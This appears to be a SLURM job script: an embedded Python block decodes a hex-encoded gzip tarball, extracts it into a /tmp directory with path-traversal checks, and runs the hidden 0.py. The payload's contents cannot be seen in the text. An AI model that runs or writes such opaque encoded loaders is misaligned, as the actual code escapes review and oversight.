#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed953d6fdb30108633eb57105e2401064dc9fa74e0b17b87b64b11041475b4e8d89240d24ddca2ffbda464042e02744bd2a2f70ca248f1de3b1e7914a37b33f437af0a73148c4d2d7bd9b2f53a7b7e9fc78bb2286f087bddb0664ec672ed5cbe85afbf901f0b3b3c40bfd890056f5892aeb3bc28ab7ab1248b919f0f036fef4dc7d3bc9866b4121259d420d2362d24cf8a9a55459eca04d25a66a2a89b94cb961519f3e35c36495b17655b1459cb5909d7aacdd98271a279c66ae7d57f39f0feca5923aac6592639946923a5acb39655a26eaa3ccfcbb62a3970103c136b173754792a98acb2a28132e769239a7cf1f3bd73fb2fc0e8787e751f7faeff24495ed47f96adb1fedf02751c076d89399ba5ff112c3b6eba836a962e29521d20907a3892915b3f482e933fba6ea0b7be899c21e57af7ed6b7217df8aadd7a0bebe4d14e955c8a6bf4b18530daee42d3cd9288e033e9b86ab510f7b10762586e3f1d42b7b5eedf76738f5bb305e89afe1743385775ec6eebe870137069cfb4b8874be2a223e8b4ff78953a71d3cb56a07c6b9da6e9dcaefd75878173c2adb91cbfae830421ff1987043ec262072d00488eaa70e5192f48325407b7e04ea0f8a35de3a0a072d3aaedbfb2e61ab30de88a1b7aa3fc1b58d32de4114132719521a7ad569ddb35c4c472fb7d15c19205ff8e1041fb41e74147eee0d973e88f164c3d8498e5b97ca315ccd86b7a3b784ded2e343ab743477ccf6933ec1129e94b1f7c3c3d48bddd447ad2c5c9263a9db00cd859d02837957fc86f84df47b4c55ef331cb1a5b13a9a9cbaafd311b85a30dd0fcf47e1c8551ff847a4e3e0bdcf3282200882200882200882200882200882200882200882fcaffc026c39519600280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
